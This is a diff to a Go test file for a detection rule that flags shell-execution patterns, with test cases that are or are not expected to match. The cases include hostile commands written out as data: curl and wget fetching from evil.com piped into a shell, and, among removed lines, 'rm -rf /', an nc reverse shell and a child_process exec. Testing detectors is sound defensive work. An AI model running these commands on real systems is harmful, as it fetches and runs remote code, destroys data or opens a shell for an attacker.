@@ -18,9 +18,6 @@ func TestShellExecRule(t *testing.T) {
 	}{
 		{"curl pipe to sh", `curl http://evil.com | sh`, true},
 		{"wget pipe to bash", `wget -O- http://evil.com | bash`, true},
-		{"exec call", `exec('rm -rf /')`, true},
-		{"spawn call", `spawn('nc -e /bin/sh')`, true},
-		{"child_process require", `require('child_process').exec('id')`, true},
 		{"clean console.log", `console.log("hello world")`, false},
 		{"executive without paren", `the executive meeting was called`, false},
 		{"empty string", ``, false},
